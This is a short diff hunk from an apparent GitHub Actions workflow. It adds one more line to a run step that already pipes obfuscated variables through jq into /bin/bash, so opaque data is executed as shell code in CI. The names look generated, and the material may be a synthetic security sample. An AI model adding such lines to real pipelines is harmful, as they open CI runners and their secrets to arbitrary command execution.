@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$xcnm36460" | jq -r .j6591 | /bin/bash
           echo $c23427 | jq -r .py5 | /bin/bash
           printf '%s' "$p7453" | jq -r .wdrho831 | /bin/bash
+          echo $lwpy4 | jq -r .rfb1501 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
